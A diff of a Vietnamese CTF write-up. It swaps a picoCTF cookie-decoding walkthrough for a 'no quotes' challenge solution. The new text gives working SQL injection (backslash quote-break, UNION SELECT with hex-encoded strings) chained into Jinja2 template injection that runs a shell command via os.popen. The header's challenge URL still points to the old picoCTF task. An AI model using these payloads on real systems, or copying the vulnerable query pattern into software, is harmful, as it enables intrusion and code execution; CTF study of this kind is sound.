@@ -1,72 +1,75 @@
-# Cookie Monster Secret Recipe
+# no quotes
 
 ## Challenge Information
 - **Category**: Web Exploitation
-- **Points**: hide
-- **Difficulty**: Medium
-- **Event**: picoCTF 2023
+- **Event**: Uoftctf 2026
 - **URL**: [Link Challenge](https://play.picoctf.org/practice/challenge/349)
 - **Author**: SteakEnthusiast
 - **Tags**: #web #SQLi #HexEncode
 ---
 ## 1. Description
-> Unless it's from "Go Go Squid!", no quotes are allowed here! Let this wholesome quote heal your soul:
-> Ai Qing: "If you didn't know about robot combat back then, what would you be doing?"
-> Wu Bai: "There's no if. As long as you're here, I'll be here."
 ## 2. Overview
 Bài này có một form đăng nhập, và challenge cung cấp source của trang đăng nhập này, khi khai thác sẽ phát hiện ra lỗ hổng SQLi và 1 hàm xử lý chuỗi đầu vào ngăn chặn `'` và `"` nhưng ta có thể bypass dễ dàng bằng kỹ thuật `hexa encode` và dùng `UNION` để lấy flag.
 ## 3. Reconnaissance
-Truy cập vào trang web và thấy form đăng nhập.
-Nhập thử một username và password bất kỳ: `test`/`test.
-
-![[Pasted image 20260110015756.png]]
-
-Sau khi bấm Login, trang web sẽ hiện ra thông báo gợi ý cho ta tìm flag.
-
-![[Pasted image 20260110015923.png]]
-
-> **Nghi vấn:** Có thể Flag nằm trong cookie mà trang web cung cấp trong response của request này.
-
--> Mở Burp Suite để đọc rõ hơn
-
-Bắt request login và xem response windown, bôi đen đoạn mã sau `secret_recipe=` và nhìn sang bên phải ô *Decoded from Base64* ta tìm được flag
-
-![[Pasted image 20260110020305.png]]
-
-## 4. Analysis & Exploitation
-
-Để bắt được các request chuyển hướng, mình có 2 cách: dùng **Burp Suite** (HTTP History) hoặc dùng **Developer Tools** của trình duyệt. Ở đây mình dùng Developer Tools cho đơn giản.
-
-### Bước 1: Monitor Network
-1. Mở F12 -> Tab **Network**.
-2. Tích vào ô **Preserve log** (Giữ lại log). *Bước này cực quan trọng, nếu không khi trang load lại, các request cũ chứa Flag sẽ biến mất.*
-3. Thực hiện Login lại.
-
-### Bước 2: Phân tích Request
-Mình quan sát thấy có 2 request `GET` lạ xuất hiện trước khi load trang `/home`. Chúng có dạng:
-
-1. `GET /next-page/id=cGljb0NURntwcm94aWVzX2Fs`
-2. `GET /next-page/id=bF90aGVfd2F5XzI1YjMxYzYyfQ==`
-
-![Screenshot Network Tab showing redirects](link_to_image_here)
-*(Chỗ này bạn chèn ảnh chụp tab Network khoanh đỏ 2 dòng request trên)*
-
-### Bước 3: Decode
-Dữ liệu trong tham số `id` nhìn giống **Base64** (kết thúc bằng dấu `=` và gồm các ký tự a-z, A-Z, 0-9).
-
-Mình tiến hành ghép 2 chuỗi này lại và decode:
-
-**Part 1:** `cGljb0NURntwcm94aWVzX2Fs` -> Decode: `picoCTF{proxies_al`
-**Part 2:** `bF90aGVfd2F5XzI1YjMxYzYyfQ==` -> Decode: `l_the_way_25b31c62}`
-
-### Script (Optional)
-Một đoạn script Python nhỏ để tự động hóa việc này (nếu lười copy paste thủ công):
+Hệ thống sử dụng một hàm `waf()` đơn giản để chặn SQL Injection:
 
 ```python
-import base64
+def waf(value: str) -> bool:
+    blacklist = ["'", '"']
+    return any(char in value for char in blacklist)
+```
 
-part1 = "cGljb0NURntwcm94aWVzX2Fs"
-part2 = "bF90aGVfd2F5XzI1YjMxYzYyfQ=="
+**Nhận xét:** WAF này cực kỳ yếu. Nó chỉ chặn dấu nháy đơn và nháy kép, bỏ ngỏ hoàn toàn dấu gạch chéo ngược (`\`) và các từ khóa SQL, tạo tiền đề cho kỹ thuật Backslash Injection và Hex Encoding.
 
-flag = base64.b64decode(part1).decode() + base64.b64decode(part2).decode()
-print("Flag found: " + flag)
+Lỗi kinh điển khi ghép chuỗi trực tiếp vào câu query:
+
+```python
+query = (
+    "SELECT id, username FROM users "
+    f"WHERE username = ('{username}') AND password = ('{password}')"
+)
+```
+
+**Nhận xét:** Dù WAF chặn dấu `'`, ta có thể truyền `\` vào trường `username`. Dấu `\` sẽ giúp đóng dấu nháy, khiến database hiểu toàn bộ đoạn `') AND password = (` là một phần của chuỗi username. Từ đó, trường `password` sẽ trở thành điểm để ta tiêm mã SQL tùy ý.
+
+Trang home render giao diện người dùng dựa trên session:
+
+```python
+return render_template_string(open("templates/home.html").read() % session["user"])
+```
+
+**Nhận xét:** Dòng code này sử dụng toán tử `%` để nối biến `session["user"]` vào chuỗi HTML **trước khi** đưa vào engine Jinja2 (`render_template_string`). Nếu ta có thể kiểm soát được `session["user"]` thành một cú pháp Jinja2 (ví dụ `{{ ... }}`), ta sẽ có được RCE. Ta sẽ thử với payload `{{7 * 7}}`:
+
+![](images/Pasted%20image%2020260301105116.png)
+
+-> Ta sẽ dùng biện pháp mạnh hơn đó là dùng `UNION`, payload sẽ là: `) UNION SELECT 1, {{7 * 7}} #`
+
+![](images/Pasted%20image%2020260301105332.png)
+
+Vẫn chưa được, vì server dùng mySQL, ta sẽ thử hexcode xem sao, payload: `) UNION SELECT 1, 0x7b7b372a377d7d #`
+
+![](images/Pasted%20image%2020260301105543.png)
+
+-> Đăng nhập thành công và hiện `49` -> SSTI + SQLi 99%
+## 4. Exploitation
+Từ các dữ kiện ở phần Recon, ta có thể xây dựng chuỗi khai thác như sau: **Dùng SQLi để giả mạo một user có tên chính là payload SSTI -> Đăng nhập thành công -> Kích hoạt SSTI tại trang Home để đọc flag.**
+
+Để đọc file flag trên server, ta dùng Python nhúng trong Jinja2:
+
+```python
+{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}
+```
+
+Vì form login không cho phép nhập dấu `'` hoặc `"`, ta không thể dùng chuỗi văn bản thông thường trong câu lệnh SQL. Thay vào đó, ta chuyển toàn bộ payload SSTI ở trên sang định dạng Hex (thập lục phân).
+
+ Payload dạng Hex: `7b7b636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b276f73275d2e706f70656e28272f72656164666c616727292e7265616428297d7d`
+
+Trong MySQL, chỉ cần thêm `0x` vào trước mã Hex, database sẽ tự hiểu đó là một chuỗi hợp lệ mà không cần dấu nháy.
+
+Tại form đăng nhập, ta inject:
+**Username:** `\`
+**Password:** `) UNION SELECT 1, 0x7b7b636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b276f73275d2e706f70656e28272f72656164666c616727292e7265616428297d7d #`
+
+-> lấy được flag
+
+![](images/Pasted%20image%2020260301104950.png)
